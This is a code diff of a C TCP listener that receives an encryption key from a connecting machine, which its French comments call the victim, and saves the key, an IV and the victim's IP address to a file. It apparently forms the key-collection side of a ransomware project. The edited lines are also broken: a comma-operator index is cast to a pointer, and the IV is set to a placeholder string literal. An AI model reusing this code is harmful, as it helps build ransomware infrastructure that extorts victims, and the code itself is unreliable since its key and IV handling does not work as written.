@@ -16,7 +16,7 @@ void handle_error(){
 int main(void) {
     int sockid;
     int server_port = 8888;
-    char *server_ip = "127.0.0.1"
+    char *server_ip = "127.0.0.1";
     sockid = socket(AF_INET, SOCK_STREAM, 0);
 
     struct sockaddr_in server_addr, client_addr;
@@ -30,7 +30,8 @@ int main(void) {
 
     if (bind_result < 0) {
         printf("Error during binding");
-    } else {
+    } 
+    else {
         printf("server listening");
         n = listen(sockid, 1);
         if (n < 0) {
@@ -47,15 +48,16 @@ int main(void) {
         printf("Accept connection from %s\n",
                inet_ntoa(client_addr.sin_addr)); //affichage de l'adresse ip de la victime
         n = recv(client_socket, (char *) buffer, BUFFER_SIZE, MSG_WAITALL);
-        //reception et affichage de la clé de chiffrage
-
+        
     }
+    char *key_iv = (char *) buffer;
+    char *key = (char *) key_iv[0,31];
+    char *iv = "(char  *) buffer2";
     char *new_ip = inet_ntoa(client_addr.sin_addr);
-    char *key = (char *) buffer;
+    
     close(sockid);
-    char *iv = "jhdefdsqkldqsdklqsj";
 
-    FILE *file = fopen(new_ip, "w");
+    FILE *file = fopen("cle", "w");
     if (file == NULL) {
         // Erreur lors de l'ouverture du fichier
         printf("Error opening file!\n");
@@ -78,7 +80,16 @@ int main(void) {
         printf("Error writing IV to file!\n");
         return 1;
     }
-
+    if (fputs("\n", file) == EOF) {
+        // Erreur lors de l'écriture du retour à la ligne
+        printf("Error writing newline to file!\n");
+        return 1;
+    }
+    if (fputs((char*)new_ip, file) == EOF) {
+        // Erreur lors de l'écriture de l'IV dans le fichier
+        printf("Error writing IV to file!\n");
+        return 1;
+    }
     // Ferme le fichier
     fclose(file);
 
